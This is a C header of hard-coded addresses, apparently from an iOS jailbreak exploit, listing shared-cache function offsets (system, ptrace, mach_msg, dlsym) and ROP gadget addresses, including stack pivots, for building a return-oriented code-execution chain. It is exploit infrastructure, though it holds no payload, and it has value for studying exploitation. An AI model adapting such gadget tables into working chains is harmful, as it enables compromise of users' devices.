// libsystem_kernel.dylib
#define _dsc_open			0x332cfdc4
#define _dsc_mkdir			0x332c2c34
#define _dsc_ioctl			(0x332c1bf8 + 1)
#define _dsc_close			0x332c071c
#define _dsc_ptrace			(0x332d0394 + 1)

// libsystem_c.dylib
#define _dsc_fopen			(0x35e5f004 + 1)
#define _dsc_fread			(0x35e65814 + 1)
#define _dsc_fclose			(0x35e5f65c + 1)
#define _dsc_exit			(0x35e619d0 + 1)
#define _dsc_syslog			(0x35e59ad0 + 1)
#define _dsc_sysctl			(0x35e56c64 + 1)
#define _dsc_malloc			(0x35e56184 + 1)
#define _dsc_memmem			(0x35e6fcf0 + 1)
#define _dsc_sleep			(0x35e6da54 + 1)
#define _dsc_bootstrap_look_up		(0xDEADBEEF + 1)
#define _dsc_bsdthread_terminate	(0xDEADBEEF + 1)

#define LIBC_POP_R0			0x35ec6340
#define LIBC_POP_R0123			0x35ec6b10
#define LIBC_POP_R47			(0x35e79f3e + 1)
#define LIBC_BLX_R4_POP_R47		(0x35e79f38 + 1)
#define LIBC_MOV_SP_R4__POP_R47		(0x35e7fcd8 + 1)
#define LIBC_STR_R0_R4__POP_R47		(0x35e9349a + 1)
#define LIBC_LDR_R0_R0__POP_R7		(0x35e594b4 + 1)
#define LIBC_SUB_R0_R4__POP_R4567	(0x35e7e246 + 1)

// offsets according to planetbeing's extract of dsc

// /System/Library/Frameworks/CoreMotion.framework/CoreMotion
#define GADGET_SUBS_R0_R0_R1__POP7      (0x3294f748 + 1)

// /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
#define GADGET_MOV_R1_R0__POP_R47       (0x34f509cc + 1)

// /System/Library/Frameworks/AddressBook.framework/AddressBook
#define GADGET_MOV_R0_R1__POP_R47       (0x36c0d26e + 1)
#define GADGET_MOV_R0_R4__POP_R47       (0x36c10d5c + 1)

// /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
#define GADGET_MOV_R1_R4__POP_R47       (0x3307e0e4 + 1)

// /System/Library/PrivateFrameworks/FaceCoreLight.framework/FaceCoreLight
#define GADGET_ADD_R0_R0_R1__POP457     (0x376ebae8 + 1)

// libsystem_c.dylib
#define _dsc_proc_pidinfo               (0x32afe4e0 + 1)
#define _dsc_system                     (0x32b0d814 + 1)
#define _dsc_strcpy                     0x32afbd30

// libsystem_kernel.dylib
#define _dsc_shm_open                   0x35c654a8
#define _dsc_mmap                       (0x35c63658 + 1)
#define _dsc_mach_task_self             (0x35c71d88 + 1)
#define _dsc_mach_port_allocate         (0x35c63e44 + 1)
#define _dsc_mach_port_insert_right     (0x35c63e70 + 1)
#define _dsc_mach_msg		        (0x35c631d4 + 1)

// libdyld.dylib
#define _dsc_dlsym                      (0x333fd6ec + 1)

// notifyd stuff

// pthread_mutex_lock+0x1B6
#define GADGET_MOV_SP_R4_POP8_10_11_4567   (0x33271c82 + 1)

// uloc_toLanguageTag+0x24B2
#define GADGET_ADD_SP_120_POP8_10_4567     (0x31a02e2e + 1)

// xmlRegisterInputCallbacks+0x36
#define GADGET_MOV_LR_R4_MOV_R0_LR_POP47   (0x377f001a + 1)

// __aeabi_cfcmpeq+0x10
#define GADGET_POP0123PC                   0x332e6b10

// /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
// vt_Copy_420f_420v_arm+0x220
// 35982100        e28dd008        add     sp, sp, #8      @ 0x8
// 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
// 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
// 3598210c        e8bd0d00        pop     {r8, sl, fp}
// 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
#define GADGET_HOLY                        0x35982100
